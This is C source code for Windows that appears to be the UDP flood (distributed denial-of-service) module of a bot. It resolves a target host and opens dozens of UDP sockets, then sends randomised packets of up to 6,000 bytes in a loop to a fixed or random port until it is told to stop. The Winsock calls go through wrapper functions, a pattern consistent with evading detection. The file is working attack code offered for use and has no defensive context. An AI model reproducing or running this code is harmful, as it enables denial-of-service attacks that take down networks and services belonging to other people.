#include "../Includes/includes.h"

#ifdef INCLUDE_DDOS
DWORD WINAPI DdosUdp(LPVOID)
{
    char cTargetHost[MAX_PATH];
    strcpy(cTargetHost, cFloodHost);

    unsigned short usTargetPort = usFloodPort;

    SOCKADDR_IN sck;
    memset(&sck, 0, sizeof(sck));

    HOSTENT *paddr;

    for(unsigned short us = 0; us < 25; us++)
    {
        paddr = fncgethostbyname(cTargetHost);
        if(paddr != NULL)
            break;

        Sleep(100);
    }

    sck.sin_addr = (*(in_addr*)*paddr->h_addr_list);

    if(usTargetPort == 0)
            sck.sin_port = GetRandNum(65545) + 1;
    else
        sck.sin_port = fnchtons(usTargetPort);

    sck.sin_family = AF_INET;

    unsigned short usSocketCount = GetRandNum(50) + 25;
    unsigned short usDelay = 15;

    SOCKET sSock[usSocketCount];
    DWORD dwMode = 1;

    for(unsigned short us = 0; us < usSocketCount; us++)
    {
        sSock[us] = fncsocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

        if(sSock[us] == INVALID_SOCKET)
            continue;

        //fncioctlsocket(sSock[us], FIONBIO, &dwMode);
    }

    unsigned short  usPacketSize = GetRandNum(4000) + 2000;
    char cPacket[MAX_DDOS_BUFFER];
    strcpy(cPacket, GenerateRandomBase64Data(usPacketSize));

    while(bDdosBusy)
    {
        if(usTargetPort == 0)
            sck.sin_port = GetRandNum(65545) + 1;

        for(unsigned short us = 0; us < usSocketCount; us++)
        {
            if(fncsendto(sSock[us], cPacket, usPacketSize - (rand() % 1500), NULL, (LPSOCKADDR)&sck, sizeof(sck)) != SOCKET_ERROR)
                dwSockPackets++;
        }

        Sleep(GetRandNum(usDelay) + (usDelay / 2));
    }

    for(unsigned short us = 0; us < usSocketCount; us++)
        fncclosesocket(sSock[us]);

    return 1;
}
#endif
